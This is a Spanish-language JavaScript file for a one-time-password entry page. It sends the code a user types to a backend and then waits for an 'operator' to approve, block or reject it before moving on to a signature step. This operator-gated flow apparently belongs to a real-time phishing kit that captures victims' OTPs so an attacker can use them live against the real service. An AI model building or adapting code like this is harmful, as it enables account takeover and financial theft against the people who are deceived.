/**
 * ─────────────────────────────────────────────
 *  SCRIPT: otp.js
 *  Página: Ingreso de OTP
 *  Incluir: <script src="/assets/js/session.js"></script>
 *           <script src="/assets/js/otp.js"></script>
 * ─────────────────────────────────────────────
 *
 *  HTML esperado:
 *  <form id="otpForm">
 *    <input id="otp" type="text" maxlength="8" required />
 *    <button type="submit">Verificar</button>
 *    <p id="errorMsg" style="display:none;"></p>
 *  </form>
 */

(async () => {
    // Si no hay sesión activa, volver al login
    if (!SessionManager.getSessionId()) {
        window.location.href = '/index.html';
        return;
    }

    const form     = document.getElementById('otpForm');
    const errorMsg = document.getElementById('errorMsg');

    function showError(msg) {
        errorMsg.textContent = msg;
        errorMsg.style.display = 'block';
    }

    function hideError() {
        errorMsg.style.display = 'none';
    }

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        hideError();

        const otp = document.getElementById('otp').value.trim();

        if (!otp) {
            showError('Ingresa el código OTP.');
            return;
        }

        try {
            const res = await fetch(window.API_BASE_URL + '/api/otp', {
                method:  'POST',
                headers: { 'Content-Type': 'application/json' },
                body:    JSON.stringify({
                    sessionId: SessionManager.getSessionId(),
                    otp
                })
            });

            const data = await res.json();

            if (!data.success) {
                showError(data.error || 'Error al enviar el OTP.');
                return;
            }

            // OTP enviado → esperar validación del operador
            SessionManager.waitForAction({
                onApproved:  () => window.Router.redirect('FIRMA'),
                onBlocked:   () => showError('Código bloqueado. Contacta soporte.'),
                onErrorData: () => {
                    showError('Código incorrecto. Intenta de nuevo.');
                    form.querySelectorAll('input, button').forEach(el => el.disabled = false);
                },
                onErrorTemp: () => showError('Error temporal. Intenta más tarde.'),
            });

            form.querySelectorAll('input, button').forEach(el => el.disabled = true);

        } catch (err) {
            console.error(err);
            showError('Error de conexión. Intenta de nuevo.');
        }
    });
})();
